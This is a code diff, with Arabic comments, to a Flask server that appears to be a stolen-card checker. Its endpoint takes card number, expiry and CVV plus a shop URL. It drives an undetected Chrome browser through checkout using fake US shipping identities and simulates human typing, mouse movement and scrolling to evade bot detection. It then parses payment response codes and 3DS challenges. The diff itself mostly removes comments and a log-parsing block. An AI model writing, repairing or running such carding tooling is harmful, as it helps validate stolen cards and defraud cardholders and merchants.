@@ -23,15 +23,12 @@ import gc
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء للسيرفر القوي ====================
-# حساب عدد العمال حسب الرامات المتوفرة
 total_ram_gb = psutil.virtual_memory().total / (1024**3)
 cpu_count = os.cpu_count() or 4
 
-# كل متصفح يستهلك تقريباً 500MB-1GB رام
-# نخلي عدد العمال = نصف عدد الأنوية أو حسب الرام
 MAX_WORKERS = min(cpu_count * 2, int(total_ram_gb / 1.5))
-MAX_WORKERS = max(MAX_WORKERS, 5)  # الحد الأدنى 5
-MAX_WORKERS = min(MAX_WORKERS, 20)  # الحد الأقصى 20
+MAX_WORKERS = max(MAX_WORKERS, 5)
+MAX_WORKERS = min(MAX_WORKERS, 20)
 
 REQUEST_TIMEOUT = 120
 TASK_QUEUE = queue.Queue()
@@ -40,10 +37,9 @@ executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# تتبع المهام والموارد
 active_tasks = {}
 active_tasks_lock = threading.Lock()
-driver_semaphore = threading.Semaphore(MAX_WORKERS)  # حد أقصى للمتصفحات المفتوحة بنفس الوقت
+driver_semaphore = threading.Semaphore(MAX_WORKERS)
 
 logger.info(f"Server config: RAM={total_ram_gb:.1f}GB, CPU={cpu_count} cores, MAX_WORKERS={MAX_WORKERS}")
 
@@ -152,18 +148,12 @@ MATCHED_ADDRESSES = [
 ]
 
 def generate_matched_shipping_data():
-    """
-    توليد بيانات شحن أمريكية متطابقة بالكامل
-    """
     address = random.choice(MATCHED_ADDRESSES).copy()
     username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
     address["email"] = f"{username}@{address['email_domain']}"
     return address
 
 def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
-    """
-    طريقة استخراج - تعطي أولوية للـ codes التي تحتوي على شرطة سفلية _
-    """
     
     valid_codes = []
     for code in all_codes:
@@ -221,9 +211,6 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     return None, None
 
 def human_type(element, text, driver):
-    """
-    كتابة النص حرف حرف بطريقة بشرية مع تأخيرات عشوائية
-    """
     try:
         element.click()
         time.sleep(random.uniform(0.1, 0.3))
@@ -239,9 +226,6 @@ def human_type(element, text, driver):
         pass
 
 def human_mouse_move(driver, element):
-    """
-    تحريك الماوس بشكل عشوائي نحو العنصر
-    """
     try:
         actions = ActionChains(driver)
         for _ in range(random.randint(1, 3)):
@@ -257,9 +241,6 @@ def human_mouse_move(driver, element):
         pass
 
 def random_scroll(driver):
-    """
-    تمرير عشوائي للصفحة لمحاكاة السلوك البشري
-    """
     try:
         total_height = driver.execute_script("return document.body.scrollHeight")
         scroll_points = random.randint(1, 3)
@@ -271,9 +252,6 @@ def random_scroll(driver):
         pass
 
 def get_chrome_major_version():
-    """
-    جلب إصدار Chrome الرئيسي المثبت على السيرفر
-    """
     try:
         import subprocess
         result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
@@ -305,16 +283,12 @@ def get_chrome_major_version():
     return None
 
 def ff(ccx, site, task_id=None):
-    """
-    دالة معالجة بطاقة واحدة وموقع واحد - تستخدم undetected-chromedriver
-    """
     
     if task_id:
         with active_tasks_lock:
             active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
         logger.info(f"[{task_id}] Started task: {site}")
     
-    # انتظار توفر مورد للمتصفح
     acquired = driver_semaphore.acquire(timeout=30)
     if not acquired:
         return {"success": False, "code": None, "error": "Server busy, max drivers reached", "task_id": task_id}
@@ -413,7 +387,7 @@ def ff(ccx, site, task_id=None):
         driver_semaphore.release()
         return {"success": False, "code": None, "error": str(e), "task_id": task_id}
     
-    # ==================== 2. تشغيل المتصفح - undetected-chromedriver ====================
+    # ==================== 2. تشغيل المتصفح ====================
     driver = None
     try:
         options = uc.ChromeOptions()
@@ -439,9 +413,10 @@ def ff(ccx, site, task_id=None):
         options.add_argument('--no-default-browser-check')
         options.add_argument('--single-process')
         options.add_argument('--disable-ipc-flooding-protection')
-        options.add_argument(f'--memory-pressure-off')
+        options.add_argument('--memory-pressure-off')
+        # حل مشكلة performance log - نشيلها
+        # options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})  # تم التعطيل
         
-        # جلب إصدار Chrome المثبت تلقائياً
         chrome_version = get_chrome_major_version()
         
         if chrome_version:
@@ -474,7 +449,7 @@ def ff(ccx, site, task_id=None):
         random_scroll(driver)
         time.sleep(random.uniform(0.5, 1.5))
         
-        # ==================== 3. تعبئة الشحن بطريقة بشرية ====================
+        # ==================== 3. تعبئة الشحن ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
             human_mouse_move(driver, email_field)
@@ -534,7 +509,7 @@ def ff(ccx, site, task_id=None):
             driver_semaphore.release()
             return {"success": False, "code": None, "error": "Shipping fill failed", "task_id": task_id}
         
-        # ==================== 4. تعبئة الدفع بطريقة بشرية ====================
+        # ==================== 4. تعبئة الدفع ====================
         try:
             driver.switch_to.default_content()
             time.sleep(random.uniform(0.5, 1.5))
@@ -1044,59 +1019,8 @@ def ff(ccx, site, task_id=None):
                 
                 final_url = driver.current_url
             
-            if not found_code and not all_codes and not order_confirmed:
-                logs = driver.get_log('performance')
-                for log in logs:
-                    try:
-                        message = json.loads(log['message'])
-                        if message.get('message', {}).get('method') == 'Network.responseReceived':
-                            url = message.get('message', {}).get('params', {}).get('response', {}).get('url', '')
-                            if '/persisted' in url and 'graphql' in url:
-                                request_id = message.get('message', {}).get('params', {}).get('requestId')
-                                if request_id:
-                                    try:
-                                        response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
-                                        body = response.get('body', '')
-                                        if body:
-                                            if 'CompletePaymentChallenge' in body:
-                                                try:
-                                                    data = json.loads(body)
-                                                    if 'data' in data and 'receipt' in data['data']:
-                                                        receipt = data['data']['receipt']
-                                                        if 'action' in receipt:
-                                                            action = receipt['action']
-                                                            if action.get('__typename') == 'CompletePaymentChallenge':
-                                                                is_3ds = True
-                                                                found_code = '3DS_REQUIRED'
-                                                                found_typename = 'CompletePaymentChallenge'
-                                                                response_result = '3DS Secure required - Please complete authentication'
-                                                                break
-                                                except:
-                                                    pass
-                                            if not found_code:
-                                                pattern = r'"code"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for code in matches:
-                                                    if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                                                        is_excluded = False
-                                                        for excluded in excluded_codes:
-                                                            if excluded in code:
-                                                                is_excluded = True
-                                                                break
-                                                        if not is_excluded and code not in all_codes:
-                                                            all_codes.append(code)
-                                            if '__typename' in body:
-                                                pattern = r'"__typename"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for typename in matches:
-                                                    if len(typename) > 3 and len(typename) < 80:
-                                                        if typename not in ['Query', 'Mutation', 'Subscription']:
-                                                            if typename not in all_typenames:
-                                                                all_typenames.append(typename)
-                                    except:
-                                        pass
-                    except:
-                        continue
+            # تم تعطيل جزء performance logs لأنه يسبب مشكلة في Chrome 149
+            # الاعتماد كلياً على JavaScript interception
             
             try:
                 final_url = driver.current_url
@@ -1236,12 +1160,6 @@ def ff(ccx, site, task_id=None):
 # ==================== Routes ====================
 @app.route('/', methods=['GET'])
 def home():
-    """
-    نقطة النهاية الرئيسية
-    
-    الاستخدام:
-    /?cc=بطاقة|شهر|سنة|cvv&url=رابط_الموقع
-    """
     cc = request.args.get('cc')
     url = request.args.get('url')
     
@@ -1274,7 +1192,6 @@ def status():
         completed = sum(1 for t in active_tasks.values() if t.get('status') == 'completed')
         errors = sum(1 for t in active_tasks.values() if t.get('status') == 'error')
     
-    # تنظيف المهام القديمة
     with active_tasks_lock:
         to_remove = [tid for tid, t in active_tasks.items() 
                      if t.get('status') != 'running' and time.time() - t.get('started', 0) > 300]
